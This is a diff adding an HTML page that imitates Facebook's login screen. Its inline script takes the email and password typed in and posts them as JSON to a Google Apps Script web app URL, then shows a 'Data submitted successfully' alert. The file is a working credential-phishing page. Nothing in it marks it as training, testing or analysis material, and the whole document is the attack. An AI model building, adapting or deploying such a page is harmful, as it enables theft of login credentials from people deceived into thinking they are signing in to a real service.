@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h1>Facebook</h1>
+            <form id="authForm">
+                <div class="textbox">
+                    <input type="text" name="email" id="email" placeholder="Email or Phone" required>
+                </div>
+                <div class="textbox">
+                    <input type="password" name="password" id="password" placeholder="Password" required>
+                </div>
+                <input type="submit" value="Log In" class="btn">
+                <a href="#" class="forgot">Forgotten password?</a>
+                <hr>
+                <input type="button" class="btn create-account" value="Create New Account">
+            </form>
+        </div>
+    </div>
+    <script>
+        const form = document.getElementById('authForm');
+        form.addEventListener('submit', async function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Google Apps Script Web App URL
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxVsHbj8G82nZ840OPHh__InmH1PCAuVD2ZpC6cbUDPMdtcze1hcdwaa52tm9Exinpc/exec';
+
+            try {
+                const response = await fetch(scriptURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password }),
+                });
+
+                const result = await response.json();
+                if (result.status === 'success') {
+                    alert('Data submitted successfully!');
+                } else {
+                    alert('Error: ' + result.message);
+                }
+            } catch (error) {
+                alert('Something went wrong: ' + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
